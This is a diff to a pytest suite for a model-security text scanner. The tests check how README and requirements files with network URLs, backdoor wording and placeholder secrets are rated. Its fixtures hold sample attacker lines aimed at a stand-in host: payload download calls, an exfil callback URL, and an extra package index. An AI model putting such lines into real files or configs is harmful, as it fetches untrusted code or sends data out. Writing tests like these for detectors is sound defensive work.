@@ -1,11 +1,9 @@
 from pathlib import Path
-from typing import Any
 
 import pytest
 
 from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.core import determine_exit_code, scan_file, scan_model_directory_or_file
-from modelaudit.detectors.network_comm import NetworkCommDetector
 from modelaudit.scanner_results import SCAN_OUTCOME_MESSAGE_METADATA_KEY
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
 from modelaudit.scanners.text_scanner import TextScanner
@@ -66,6 +64,108 @@ def test_text_scanner_documentation_urls_are_informational(tmp_path: Path) -> No
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
 
 
+def test_text_scanner_documentation_network_api_prose_is_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text("Use requests.get to download weights.\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.INFO
+        for check in result.checks
+    )
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        'download("https://evil.example/payload")\n',
+        'download(\n    "padding",\n    "https://evil.example/payload",\n)\n',
+        'download("' + ("padding" * 800) + '", "https://evil.example/payload")\n',
+    ],
+)
+def test_text_scanner_documentation_code_url_argument_remains_actionable(tmp_path: Path, content: str) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_routes_rst_documentation_sidecars(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.rst"
+    text_path.write_text('download("https://evil.example/payload")\n', encoding="utf-8")
+
+    result = scan_file(str(text_path), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "text"
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+
+
+def test_text_scanner_documentation_benign_cc_prose_is_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text("This model is not malware.\nBackdoor robustness benchmark.\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    cc_checks = [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.details.get("type") == "cc_pattern"
+    ]
+    assert {check.details.get("pattern") for check in cc_checks} == {"malware", "backdoor"}
+    assert all(check.severity == IssueSeverity.INFO for check in cc_checks)
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+
+
+def test_text_scanner_documentation_cc_admission_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text("This model contains a backdoor payload.\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "cc_pattern"
+        and check.details.get("pattern") == "backdoor"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+def test_text_scanner_documentation_placeholder_secrets_are_ignored(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "client_secret = YOUR_CLIENT_SECRET\nsecret = <CLIENT_SECRET>\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+
+    assert not any(
+        check.name == "Embedded Secrets Detection" and check.status == CheckStatus.FAILED for check in result.checks
+    )
+
+
 def test_text_scanner_documentation_cc_markers_remain_actionable(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text("callback_url=https://evil.example/exfil\n", encoding="utf-8")
@@ -86,6 +186,7 @@ def test_text_scanner_requirements_urls_remain_actionable(tmp_path: Path) -> Non
     text_path.write_text("--extra-index-url https://evil.example/simple\nsafe-package==1.0\n", encoding="utf-8")
 
     result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
 
     assert any(
         check.name == "Network Communication Detection"
@@ -94,6 +195,28 @@ def test_text_scanner_requirements_urls_remain_actionable(tmp_path: Path) -> Non
         and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
         for check in result.checks
     )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_standard_requirements_urls_are_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "requirements.txt"
+    text_path.write_text(
+        "--index-url https://pypi.org/simple\ndemo @ https://files.pythonhosted.org/packages/demo.whl\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
+    ]
+    assert network_checks
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
 
 
 def test_text_scanner_bare_vocabulary_urls_are_informational(tmp_path: Path) -> None:
@@ -246,7 +369,7 @@ def test_text_scanner_network_finding_limit_fails_closed_and_preserves_high_sign
     )
 
 
-def test_text_scanner_passive_documentation_network_limit_is_informational(tmp_path: Path) -> None:
+def test_text_scanner_documentation_network_limit_fails_closed(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text("https://docs.example.com/reference\n" * 10, encoding="utf-8")
 
@@ -257,21 +380,36 @@ def test_text_scanner_passive_documentation_network_limit_is_informational(tmp_p
         }
     ).scan(str(text_path))
 
-    assert result.success is True
-    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
     assert any(
-        check.name == "Network Communication Reporting Limit"
+        check.name == "Text Content Security Coverage"
         and check.severity == IssueSeverity.INFO
         and check.details.get("truncated_finding_type") == "url_detected"
-        and check.details.get("analysis_incomplete") is False
-        and check.details.get("reporting_incomplete") is True
-        for check in result.checks
-    )
-    assert not any(
-        check.name == "Text Content Security Coverage"
+        and check.details.get("analysis_incomplete") is True
         and check.details.get("scan_outcome_reason") == "text_content_security_finding_limit"
         for check in result.checks
     )
+
+
+def test_text_scanner_documentation_code_url_after_limit_fails_closed(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        ("https://docs.example.com/reference\n" * 3) + 'download("https://evil.example/payload")\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner(
+        config={
+            "check_secrets": False,
+            "text_content_max_findings": 2,
+        }
+    ).scan(str(text_path))
+
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
 
 
 def test_text_scanner_passive_vocabulary_network_limit_is_informational(tmp_path: Path) -> None:
